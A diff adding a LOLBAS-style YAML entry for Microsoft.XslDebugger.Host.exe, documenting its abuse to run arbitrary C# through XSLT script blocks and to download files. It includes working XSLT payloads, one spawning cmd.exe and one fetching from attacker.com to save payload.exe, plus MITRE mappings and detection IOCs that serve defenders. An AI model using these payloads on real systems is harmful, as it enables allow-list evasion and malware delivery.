@@ -1,0 +1,70 @@
+---
+Name: Microsoft.XslDebugger.Host.exe
+Description: XSLT Execution Utility included with Visual Studio for debugging XSLT transformations
+Author:
+Created: 2026-04-05
+Commands:
+  - Command: Microsoft.XslDebugger.Host.exe input.xml payload.xsl /enable:all
+    Description: Executes arbitrary C# code embedded in msxsl:script blocks within an XSLT stylesheet. The /enable:all flag enables inline script compilation and execution via the .NET XSLT engine. Can call Process.Start, WebClient, and any .NET Framework class.
+    Usecase: Execute arbitrary C# code and spawn processes through a Microsoft-signed XSLT debugger binary.
+    Category: Execute
+    Privileges: User
+    MitreID: T1220
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: XSLT
+  - Command: Microsoft.XslDebugger.Host.exe input.xml download.xsl /enable:all
+    Description: Downloads files from arbitrary URLs using System.Net.WebClient embedded in an XSLT msxsl:script block. The XSLT file contains C# code that calls WebClient.DownloadFile() to save remote content to disk.
+    Usecase: Download files from a remote server using a Microsoft-signed XSLT debugger binary.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Download: HTTP
+Full_Path:
+  - Path: C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Xml\Microsoft.XslDebugger.Host.exe
+  - Path: C:\Program Files (x86)\Microsoft Visual Studio\2022\Community\Common7\IDE\Xml\Microsoft.XslDebugger.Host.exe
+  - Path: C:\Program Files\Microsoft Visual Studio\2022\Professional\Common7\IDE\Xml\Microsoft.XslDebugger.Host.exe
+  - Path: C:\Program Files\Microsoft Visual Studio\2022\Enterprise\Common7\IDE\Xml\Microsoft.XslDebugger.Host.exe
+Code_Sample:
+  - Code: |-
+      <!-- input.xml -->
+      <?xml version="1.0"?><data>test</data>
+
+      <!-- payload.xsl (Execute) -->
+      <?xml version="1.0"?>
+      <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+        xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:custom">
+        <msxsl:script language="C#" implements-prefix="user"><![CDATA[
+          public string execute() {
+            System.Diagnostics.Process.Start("cmd.exe");
+            return "done";
+          }
+        ]]></msxsl:script>
+        <xsl:template match="/"><xsl:value-of select="user:execute()"/></xsl:template>
+      </xsl:stylesheet>
+
+      <!-- download.xsl (Download) -->
+      <?xml version="1.0"?>
+      <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+        xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:custom">
+        <msxsl:script language="C#" implements-prefix="user"><![CDATA[
+          public string download() {
+            new System.Net.WebClient().DownloadFile("http://attacker.com/payload", @"C:\Users\Public\payload.exe");
+            return "done";
+          }
+        ]]></msxsl:script>
+        <xsl:template match="/"><xsl:value-of select="user:download()"/></xsl:template>
+      </xsl:stylesheet>
+Detection:
+  - IOC: Microsoft.XslDebugger.Host.exe execution outside of devenv.exe parent process
+  - IOC: Microsoft.XslDebugger.Host.exe with /enable:all command-line argument
+  - IOC: Microsoft.XslDebugger.Host.exe spawning child processes (cmd.exe, powershell.exe)
+  - IOC: Microsoft.XslDebugger.Host.exe making outbound HTTP/HTTPS connections
+Resources:
+  - Link: https://learn.microsoft.com/en-us/dotnet/standard/data/xml/xslt-transformations
+  - Link: https://learn.microsoft.com/en-us/dotnet/standard/data/xml/script-blocks-using-msxsl-script
+Acknowledgement:
+  - Person: Noam
+    Handle: '@pumi96'
